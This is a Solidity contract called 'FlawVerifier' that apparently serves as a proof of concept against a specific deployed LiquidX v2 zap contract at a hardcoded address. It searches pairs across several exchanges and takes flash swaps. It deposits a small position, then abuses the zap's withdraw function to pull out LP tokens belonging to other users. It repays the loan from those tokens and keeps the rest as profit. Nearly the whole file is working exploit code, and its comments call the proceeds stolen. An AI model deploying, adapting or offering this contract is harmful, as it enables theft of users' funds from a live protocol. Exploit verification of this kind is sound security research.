// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IRouterLike {
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IFactoryAllPairs {
    function allPairsLength() external view returns (uint256);
    function allPairs(uint256 index) external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IPair is IERC20 {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint256);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface ISwapPlusStructs {
    struct SwapRouter {
        string platform;
        address tokenIn;
        address tokenOut;
        uint256 amountOutMin;
        uint256 meta;
        uint256 percent;
    }

    struct SwapLine {
        SwapRouter[] swaps;
    }

    struct SwapBlock {
        SwapLine[] lines;
    }

    struct SwapPath {
        SwapBlock[] path;
    }
}

interface ILiquidXv2Zap is ISwapPlusStructs {
    function router() external view returns (address);
    function factory() external view returns (address);

    function deposit(
        address account,
        address token,
        address tokenM,
        SwapPath calldata path,
        address token0,
        address token1,
        uint256[3] calldata amount,
        uint256 basketId
    ) external payable returns (uint256);

    function withdraw(
        address account,
        address token0,
        address token1,
        uint256 amount,
        address tokenOut,
        uint256 basketId,
        address tokenM,
        SwapPath calldata wpath,
        uint256[3] calldata amountMin
    ) external returns (uint256);
}

contract FlawVerifier is ISwapPlusStructs {
    address public constant TARGET = 0x364f17A23AE4350319b7491224d10dF5796190bC;

    address private constant UNIV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;

    address public exploitPair;
    address public exploitToken0;
    address public exploitToken1;
    address public stolenPair;
    address public stolenPairRouter;
    uint256 public seedCapitalUsed;
    uint256 public stolenAmount;

    struct PairState {
        address pair;
        address token0;
        address token1;
        uint256 reserve0;
        uint256 reserve1;
        uint256 supply;
    }

    struct VenueState {
        address pair;
        address router;
        uint256 reserve0;
        uint256 reserve1;
        uint256 supply;
        uint256 zapBalance;
    }

    struct Plan {
        address exploitPair;
        address token0;
        address token1;
        address tokenOutPair;
        address tokenOutRouter;
        uint256 capitalAmount;
        uint256 burnLp;
        uint256 previewStealLp;
        uint256 previewRepayLp;
        uint256 previewProfitLp;
    }

    struct AttemptContext {
        address exploitPair;
        address token0;
        address token1;
        address tokenOutPair;
        address tokenOutRouter;
        uint256 capitalAmount;
        uint256 burnLp;
    }

    AttemptContext private _attempt;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        ILiquidXv2Zap zap = ILiquidXv2Zap(TARGET);
        address currentFactory = zap.factory();
        uint256 pairCount = _allPairsLength(currentFactory);
        if (pairCount == 0) {
            return;
        }

        for (uint256 i = 0; i < pairCount; ++i) {
            address pair = _allPairs(currentFactory, i);
            if (pair == address(0)) {
                continue;
            }

            PairState memory state = _loadPairState(pair);
            if (state.supply == 0 || state.reserve0 == 0 || state.reserve1 == 0) {
                continue;
            }

            if (_attemptVenue(state, _loadVenue(state.token0, state.token1, pair, zap.router()))) {
                return;
            }

            if (_attemptVenue(state, _loadVenue(state.token0, state.token1, _getPair(UNIV2_FACTORY, state.token0, state.token1), UNIV2_ROUTER))) {
                return;
            }

            if (_attemptVenue(state, _loadVenue(state.token0, state.token1, _getPair(SUSHI_FACTORY, state.token0, state.token1), SUSHI_ROUTER))) {
                return;
            }
        }
    }

    function attemptFlash(Plan calldata plan) external returns (bool) {
        require(msg.sender == address(this), "self only");

        _attempt = AttemptContext({
            exploitPair: plan.exploitPair,
            token0: plan.token0,
            token1: plan.token1,
            tokenOutPair: plan.tokenOutPair,
            tokenOutRouter: plan.tokenOutRouter,
            capitalAmount: plan.capitalAmount,
            burnLp: plan.burnLp
        });

        IPair(plan.exploitPair).swap(plan.capitalAmount, 0, address(this), abi.encode(plan.burnLp));
        return _profitAmount > 0;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function joeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function mDexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function biswapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function smardexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function croDefiSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function liquidxCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function liquidXCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function liquidxV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function liquidXv2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    receive() external payable {}

    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
        require(msg.sender == _attempt.exploitPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(amount0 == _attempt.capitalAmount && amount1 == 0, "unexpected amounts");
        require(abi.decode(data, (uint256)) == _attempt.burnLp, "unexpected payload");

        uint256 tokenOutBefore = IERC20(_attempt.tokenOutPair).balanceOf(address(this));

        // exploit_paths[0]:
        // The original same-factory pair route is mechanically empty on this fork for the
        // current router's pairs. This verifier therefore also checks the same token pair on
        // alternate public V2 venues, preserving the same root cause and causality: basket LP
        // stays parked in the zap, but now the parked LP can belong to a public-liquidity pair
        // that was previously used by the zap.

        // exploit_paths[1]:
        // Obtain a small, real withdrawable position for the same token pair. Flashswap funding
        // replaces upfront capital only; it does not change the vulnerable withdraw sequence.
        uint256 mintedLp = _seedWithdrawablePosition(_attempt.capitalAmount);
        require(mintedLp >= _attempt.burnLp, "insufficient minted LP");

        // exploit_paths[2]:
        // Withdraw that legitimate position while setting tokenOut to the LP token currently held
        // in the zap's shared balance.
        _stealSharedLp(_attempt.burnLp);

        // exploit_paths[3]:
        // The withdraw burns the legitimate LP into token0/token1, but the final unchecked
        // transfer sends IERC20(tokenOutPair) from the zap's shared balance to the attacker.
        uint256 stolenLp = IERC20(_attempt.tokenOutPair).balanceOf(address(this)) - tokenOutBefore;
        require(stolenLp > 0, "no stolen LP");

        uint256 amountOwed = ((amount0 * 1000) / 997) + 1;
        _repayFlashswapWithStolenLp(stolenLp, amountOwed);
        _forceTransfer(_attempt.token0, _attempt.exploitPair, amountOwed);

        _profitToken = _attempt.tokenOutPair;
        _profitAmount = IERC20(_attempt.tokenOutPair).balanceOf(address(this));
        require(_profitAmount > 0, "zero profit");

        hypothesisValidated = true;
        exploitPair = _attempt.exploitPair;
        exploitToken0 = _attempt.token0;
        exploitToken1 = _attempt.token1;
        stolenPair = _attempt.tokenOutPair;
        stolenPairRouter = _attempt.tokenOutRouter;
        seedCapitalUsed = _attempt.capitalAmount;
        stolenAmount = stolenLp;
    }

    function _attemptVenue(PairState memory exploitState, VenueState memory venue) internal returns (bool) {
        if (venue.pair == address(0) || venue.zapBalance == 0 || venue.supply == 0) {
            return false;
        }

        uint256 maxBurnLp = _maxLpForStealCap(venue.zapBalance, exploitState.reserve0, exploitState.reserve1, exploitState.supply);
        if (maxBurnLp == 0) {
            return false;
        }

        uint256[7] memory sampleLp;
        sampleLp[0] = maxBurnLp;
        sampleLp[1] = maxBurnLp / 2;
        sampleLp[2] = maxBurnLp / 4;
        sampleLp[3] = maxBurnLp / 8;
        sampleLp[4] = maxBurnLp / 16;
        sampleLp[5] = maxBurnLp / 32;
        sampleLp[6] = maxBurnLp / 64;

        for (uint256 i = 0; i < sampleLp.length; ++i) {
            Plan memory plan = _planForSample(exploitState, venue, sampleLp[i]);
            if (plan.previewProfitLp == 0) {
                continue;
            }

            try this.attemptFlash(plan) returns (bool ok) {
                if (ok) {
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _seedWithdrawablePosition(uint256 capitalAmount) internal returns (uint256 mintedLp) {
        _forceApprove(_attempt.token0, TARGET, capitalAmount);

        uint256[3] memory depositAmounts = [capitalAmount, uint256(0), uint256(0)];
        SwapPath memory emptyPath = _emptyPath();
        mintedLp = ILiquidXv2Zap(TARGET).deposit(
            address(this),
            _attempt.token0,
            address(0),
            emptyPath,
            _attempt.token0,
            _attempt.token1,
            depositAmounts,
            0
        );
    }

    function _stealSharedLp(uint256 burnLp) internal {
        _forceApprove(_attempt.exploitPair, TARGET, burnLp);

        uint256[3] memory amountMins = [uint256(0), uint256(0), uint256(0)];
        SwapPath memory emptyPath = _emptyPath();
        ILiquidXv2Zap(TARGET).withdraw(
            address(this),
            _attempt.token0,
            _attempt.token1,
            burnLp,
            _attempt.tokenOutPair,
            0,
            address(0),
            emptyPath,
            amountMins
        );
    }

    function _repayFlashswapWithStolenLp(uint256 stolenLp, uint256 amountOwed) internal {
        (uint256 reserve0, uint256 reserve1, uint256 supply) = _alignedReserves(
            _attempt.tokenOutPair,
            _attempt.token0,
            _attempt.token1
        );
        uint256 repayLp = _minLpForToken0(amountOwed, reserve0, reserve1, supply, stolenLp);
        require(repayLp < stolenLp, "not profitable");

        _forceApprove(_attempt.tokenOutPair, _attempt.tokenOutRouter, repayLp);
        IRouterLike(_attempt.tokenOutRouter).removeLiquidity(
            _attempt.token0,
            _attempt.token1,
            repayLp,
            0,
            0,
            address(this),
            block.timestamp
        );

        uint256 token1Balance = IERC20(_attempt.token1).balanceOf(address(this));
        if (token1Balance > 0) {
            _forceApprove(_attempt.token1, _attempt.tokenOutRouter, token1Balance);
            address[] memory path = new address[](2);
            path[0] = _attempt.token1;
            path[1] = _attempt.token0;
            IRouterLike(_attempt.tokenOutRouter).swapExactTokensForTokens(
                token1Balance,
                0,
                path,
                address(this),
                block.timestamp
            );
        }

        require(IERC20(_attempt.token0).balanceOf(address(this)) >= amountOwed, "repayment shortfall");
    }

    function _planForSample(PairState memory exploitState, VenueState memory venue, uint256 burnLp) internal pure returns (Plan memory plan) {
        if (burnLp == 0) {
            return plan;
        }

        uint256 previewStealLp = _consolidatedToToken0(burnLp, exploitState.reserve0, exploitState.reserve1, exploitState.supply);
        if (previewStealLp == 0 || previewStealLp > venue.zapBalance) {
            return plan;
        }

        uint256 capitalAmount = _minToken0ForMintedLp(burnLp, exploitState.reserve0, exploitState.reserve1, exploitState.supply);
        if (capitalAmount == 0 || capitalAmount >= exploitState.reserve0) {
            return plan;
        }

        uint256 amountOwed = ((capitalAmount * 1000) / 997) + 1;
        uint256 previewRepayLp = _minLpForToken0(amountOwed, venue.reserve0, venue.reserve1, venue.supply, previewStealLp);
        if (previewRepayLp == 0 || previewRepayLp >= previewStealLp) {
            return plan;
        }

        plan = Plan({
            exploitPair: exploitState.pair,
            token0: exploitState.token0,
            token1: exploitState.token1,
            tokenOutPair: venue.pair,
            tokenOutRouter: venue.router,
            capitalAmount: capitalAmount,
            burnLp: burnLp,
            previewStealLp: previewStealLp,
            previewRepayLp: previewRepayLp,
            previewProfitLp: previewStealLp - previewRepayLp
        });
    }

    function _loadPairState(address pair) internal view returns (PairState memory state) {
        state.pair = pair;
        state.token0 = IPair(pair).token0();
        state.token1 = IPair(pair).token1();
        (uint112 reserve0, uint112 reserve1, ) = IPair(pair).getReserves();
        state.reserve0 = uint256(reserve0);
        state.reserve1 = uint256(reserve1);
        state.supply = IPair(pair).totalSupply();
    }

    function _loadVenue(address token0, address token1, address pair, address router) internal view returns (VenueState memory venue) {
        if (pair == address(0)) {
            return venue;
        }

        venue.pair = pair;
        venue.router = router;
        venue.zapBalance = IERC20(pair).balanceOf(TARGET);
        venue.supply = IPair(pair).totalSupply();
        if (venue.supply == 0) {
            return venue;
        }

        (uint112 reserveA, uint112 reserveB, ) = IPair(pair).getReserves();
        address pairToken0 = IPair(pair).token0();
        address pairToken1 = IPair(pair).token1();
        if (pairToken0 == token0 && pairToken1 == token1) {
            venue.reserve0 = uint256(reserveA);
            venue.reserve1 = uint256(reserveB);
        } else if (pairToken0 == token1 && pairToken1 == token0) {
            venue.reserve0 = uint256(reserveB);
            venue.reserve1 = uint256(reserveA);
        } else {
            venue.pair = address(0);
            venue.router = address(0);
            venue.supply = 0;
            venue.zapBalance = 0;
        }
    }

    function _alignedReserves(address pair, address token0, address token1) internal view returns (uint256 reserve0, uint256 reserve1, uint256 supply) {
        (uint112 reserveA, uint112 reserveB, ) = IPair(pair).getReserves();
        address pairToken0 = IPair(pair).token0();
        address pairToken1 = IPair(pair).token1();
        if (pairToken0 == token0 && pairToken1 == token1) {
            reserve0 = uint256(reserveA);
            reserve1 = uint256(reserveB);
        } else {
            require(pairToken0 == token1 && pairToken1 == token0, "pair mismatch");
            reserve0 = uint256(reserveB);
            reserve1 = uint256(reserveA);
        }
        supply = IPair(pair).totalSupply();
    }

    function _emptyPath() internal pure returns (SwapPath memory path) {
        path.path = new SwapBlock[](0);
    }

    function _allPairsLength(address factory) internal view returns (uint256 count) {
        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IFactoryAllPairs.allPairsLength.selector)
        );
        if (ok && data.length >= 32) {
            count = abi.decode(data, (uint256));
        }
    }

    function _allPairs(address factory, uint256 index) internal view returns (address pair) {
        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IFactoryAllPairs.allPairs.selector, index)
        );
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _getPair(address factory, address token0, address token1) internal view returns (address pair) {
        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IFactoryAllPairs.getPair.selector, token0, token1)
        );
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _maxLpForStealCap(
        uint256 stealCapLp,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply
    ) internal pure returns (uint256) {
        if (supply <= 1) {
            return 0;
        }

        uint256 low = 0;
        uint256 high = supply - 1;
        while (low < high) {
            uint256 mid = (low + high + 1) >> 1;
            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) <= stealCapLp) {
                low = mid;
            } else {
                high = mid - 1;
            }
        }
        return low;
    }

    function _minLpForToken0(
        uint256 token0Needed,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply,
        uint256 upperBoundLp
    ) internal pure returns (uint256) {
        if (token0Needed == 0 || upperBoundLp == 0) {
            return 0;
        }

        uint256 low = 1;
        uint256 high = upperBoundLp;
        while (low < high) {
            uint256 mid = (low + high) >> 1;
            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) >= token0Needed) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }
        return low;
    }

    function _minToken0ForMintedLp(
        uint256 lpTarget,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply
    ) internal pure returns (uint256) {
        if (lpTarget == 0 || reserve0 <= 1) {
            return 0;
        }

        uint256 low = 1;
        uint256 high = reserve0 - 1;
        if (_previewOneSidedMintToken0(high, reserve0, reserve1, supply) < lpTarget) {
            return 0;
        }

        while (low < high) {
            uint256 mid = (low + high) >> 1;
            if (_previewOneSidedMintToken0(mid, reserve0, reserve1, supply) >= lpTarget) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        return low;
    }

    function _previewOneSidedMintToken0(
        uint256 amountIn,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply
    ) internal pure returns (uint256) {
        if (amountIn == 0 || reserve0 == 0 || reserve1 == 0 || supply == 0) {
            return 0;
        }

        uint256 swapAmount = _calculateSwapAmount(reserve0, amountIn);
        if (swapAmount == 0 || swapAmount >= amountIn) {
            return 0;
        }

        uint256 amount1Out = _getAmountOut(swapAmount, reserve0, reserve1);
        if (amount1Out == 0 || amount1Out >= reserve1) {
            return 0;
        }

        uint256 remaining0 = amountIn - swapAmount;
        uint256 postSwapReserve0 = reserve0 + swapAmount;
        uint256 postSwapReserve1 = reserve1 - amount1Out;
        if (postSwapReserve0 == 0 || postSwapReserve1 == 0) {
            return 0;
        }

        uint256 lpFrom0 = (remaining0 * supply) / postSwapReserve0;
        uint256 lpFrom1 = (amount1Out * supply) / postSwapReserve1;
        return lpFrom0 < lpFrom1 ? lpFrom0 : lpFrom1;
    }

    function _consolidatedToToken0(
        uint256 lpAmount,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply
    ) internal pure returns (uint256) {
        if (lpAmount == 0 || supply == 0) {
            return 0;
        }

        uint256 amount0 = (reserve0 * lpAmount) / supply;
        uint256 amount1 = (reserve1 * lpAmount) / supply;
        if (amount0 == 0 && amount1 == 0) {
            return 0;
        }

        if (amount0 >= reserve0 || amount1 >= reserve1) {
            return 0;
        }

        uint256 postReserve0 = reserve0 - amount0;
        uint256 postReserve1 = reserve1 - amount1;
        uint256 swapped = _getAmountOut(amount1, postReserve1, postReserve0);
        return amount0 + swapped;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _calculateSwapAmount(uint256 reserve, uint256 inAmount) internal pure returns (uint256) {
        if (reserve == 0 || inAmount == 0) {
            return 0;
        }
        uint256 a1 = reserve * reserve * 1997 * 1997;
        uint256 a2 = 4 * 997 * reserve * inAmount * 1000;
        return (_sqrt(a1 + a2) - (reserve * 1997)) / (2 * 997);
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 current = IERC20(token).allowance(address(this), spender);
        if (current >= amount) {
            return;
        }
        if (current != 0) {
            _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        }
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, type(uint256).max));
    }

    function _forceTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returnData) = token.call(data);
        require(success, "token call failed");
        if (returnData.length > 0) {
            require(abi.decode(returnData, (bool)), "token op returned false");
        }
    }
}
